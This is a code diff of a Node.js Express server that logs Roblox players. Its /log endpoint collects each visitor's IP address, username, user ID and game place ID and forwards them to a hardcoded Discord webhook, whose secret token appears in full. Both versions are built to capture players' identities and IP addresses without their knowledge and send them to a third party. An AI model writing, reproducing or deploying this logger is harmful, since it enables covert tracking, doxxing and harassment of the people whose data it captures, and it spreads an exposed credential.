@@ -1,83 +1,71 @@
 const express = require('express');
+const https = require('https');
 const app = express();
 
-// YOUR WEBHOOK - VERIFIED WORKING
-const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1469544408444567766/3PcIRNOpYQ8bsYJECwwDXK6H24Aoe6VpidxaURUv6ThwVkke3IgcnKdZPDIenEBKbMgi';
+// YOUR WEBHOOK
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1469544408444567766/3PcIRNOpYQ8bsYJECwwDXK6H24Aoe6VpidxaURUv6ThwVkke3IgcnKdZPDIenEBKbMgi';
 
-function sendDiscord(data) {
-    const payload = {
+function postToDiscord(playerData) {
+    const payload = JSON.stringify({
         embeds: [{
-            title: '🕵️ Roblox Player Captured',
-            description: `\`UserID: ${data.userId}\``,
-            color: 16711680,
+            title: '🕵️ Player Logged',
             fields: [
-                { name: '👤 Player', value: data.playerName || 'Unknown', inline: true },
-                { name: '🌐 IP', value: `\`${data.ipAddress}\``, inline: true },
-                { name: '📍 PlaceID', value: data.placeId || 'Unknown', inline: true },
-                { name: '🆔 JobID', value: (data.jobId || '').slice(-8), inline: true },
-                { name: '💻 OS', value: data.osPlatform || 'Unknown', inline: true }
+                { name: '👤 Name', value: playerData.playerName || 'Unknown', inline: true },
+                { name: '🆔 ID', value: playerData.userId || 'Unknown', inline: true },
+                { name: '🌐 IP', value: `\`${playerData.ipAddress}\``, inline: true },
+                { name: '📍 Place', value: playerData.placeId || 'N/A', inline: true }
             ],
-            timestamp: new Date().toISOString(),
-            footer: { text: 'Railway IP Logger' }
+            color: 16711680,
+            timestamp: new Date().toISOString()
         }]
-    };
+    });
     
-    // RETRY 3x with delays
-    for (let i = 0; i < 3; i++) {
-        try {
-            const response = await fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            
-            if (response.ok) {
-                console.log('✅ Discord SENT');
-                return;
-            }
-        } catch (error) {
-            console.log(`⚠️ Discord attempt ${i+1} failed:`, error.message);
-            await new Promise(r => setTimeout(r, 1000 * (i + 1)));
+    const req = https.request(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': Buffer.byteLength(payload)
         }
-    }
-    console.log('❌ Discord FAILED after 3 retries');
+    }, (res) => {
+        console.log('✅ Discord OK:', res.statusCode);
+    });
+    
+    req.on('error', (e) => {
+        console.log('⚠️ Discord failed:', e.message);
+    });
+    
+    req.write(payload);
+    req.end();
 }
 
-app.get('/log', async (req, res) => {
-    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
-                     req.headers['x-real-ip'] || 
-                     req.ip || 'Unknown (Railway)';
+app.get('/log', (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || 
+               req.headers['x-real-ip'] || 
+               req.ip || 'Unknown';
     
-    const playerData = {
-        userId: req.query.userId || 'Unknown',
+    const data = {
         playerName: req.query.playerName || 'Unknown',
-        displayName: req.query.displayName || 'Unknown',
+        userId: req.query.userId || 'Unknown',
         placeId: req.query.placeId || 'Unknown',
-        jobId: req.query.jobId || 'Unknown',
-        osPlatform: req.query.osPlatform || 'Unknown',
-        ipAddress: clientIP
+        ipAddress: ip.split(',')[0]
     };
     
-    console.log('🎮 NEW PLAYER:', playerData.playerName, '| IP:', clientIP);
+    console.log(`🎮 ${data.playerName} | ${data.ipAddress}`);
     
-    // SEND TO DISCORD IMMEDIATELY
-    await sendDiscord(playerData);
+    // SAFE DISCORD SEND
+    try {
+        postToDiscord(data);
+    } catch (e) {
+        console.log('Discord error:', e.message);
+    }
     
-    res.json({ 
-        status: 'success', 
-        message: 'Logged to Discord', 
-        ip: clientIP,
-        player: playerData.playerName 
-    });
+    res.json({ ok: true, ip: data.ipAddress });
 });
 
 app.get('/health', (req, res) => {
-    res.json({ status: 'active', webhook: DISCORD_WEBHOOK.slice(0, 50) + '...' });
+    res.json({ status: 'OK', time: new Date().toISOString() });
 });
 
-const port = process.env.PORT || 3000;
-app.listen(port, () => {
-    console.log(`🚀 Logger on port ${port}`);
-    console.log(`📡 Test: /health`);
-    console.log(`🔗 Webhook: ${DISCORD_WEBHOOK.slice(0, 50)}...`);
+app.listen(process.env.PORT || 3000, () => {
+    console.log('🚀 Logger started');
 });
